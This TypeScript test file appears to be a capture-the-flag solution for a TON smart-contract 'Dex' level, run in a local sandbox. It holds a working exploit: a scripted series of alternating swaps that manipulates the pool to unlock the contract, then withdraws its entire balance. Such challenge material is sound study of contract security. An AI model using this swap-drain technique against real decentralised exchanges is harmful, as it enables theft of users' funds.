import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { fromNano, toNano } from '@ton/core';
import { Dex } from '../wrappers/wrappers/Dex';
import '@ton/test-utils';

// npx blueprint test Dex.spec.ts
describe('Dex', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<Dex>;
    let player: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');

        level = blockchain.openContract(await Dex.fromInit(0n));

        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );
    });

    it('Exploit', async () => {
        expect(await level.getIsLocked()).toEqual(true);

        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            'CreateUser',
        );

        await sendSwap(1n, 1n);
        await sendSwap(1n, 0n);
        await sendSwap(2n, 1n);
        await sendSwap(2n, 0n);
        await sendSwap(3n, 1n);
        await sendSwap(3n, 0n);
        await sendSwap(4n, 1n);
        await sendSwap(4n, 0n);
        await sendSwap(5n, 1n);
        await sendSwap(5n, 0n);
        await sendSwap(6n, 1n);
        await sendSwap(6n, 0n);
        await sendSwap(7n, 1n);
        await sendSwap(7n, 0n);
        await sendSwap(8n, 1n);
        await sendSwap(8n, 0n);
        await sendSwap(9n, 1n);
        await sendSwap(9n, 0n);
        await sendSwap(10n, 1n);
        await sendSwap(10n, 0n);

        await sendSwap(8n, 1n);
        await sendSwap(7n, 0n);
        await sendSwap(7n, 1n);
        await sendSwap(6n, 0n);
        await sendSwap(6n, 1n);
        await sendSwap(5n, 0n);
        await sendSwap(5n, 1n);
        await sendSwap(4n, 0n);
        await sendSwap(4n, 1n);
        await sendSwap(3n, 0n);
        await sendSwap(3n, 1n);
        await sendSwap(2n, 0n);
        await sendSwap(2n, 1n);
        await sendSwap(1n, 0n);
        await sendSwap(1n, 1n);

        // await getBalances();

        expect(await level.getIsLocked()).toEqual(false);

        await level.send(
            player.getSender(),
            {
                value: toNano('1.2'),
            },
            { $$type: 'Withdraw', value: (await blockchain.getContract(level.address)).balance },
        );

        expect((await blockchain.getContract(level.address)).balance).toEqual(0n);

        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            'Solve',
        );

        expect(await level.getIsSolved()).toEqual(true);
    });

    const getBalances = async () => {
        console.log('Token A', await level.getTokenaAmount());
        console.log('Token B', await level.getTokenbAmount());
        console.log('Balance A', await level.getTokenaBalance());
        console.log('Balance B', await level.getTokenbBalance());
    };

    const sendSwap = async (amount: bigint, a_b: bigint) => {
        await level.send(
            player.getSender(),
            {
                value: toNano('0.15'),
            },
            {
                $$type: 'Swap',
                amount: amount,
                a_b: a_b,
            },
        );
    };
});
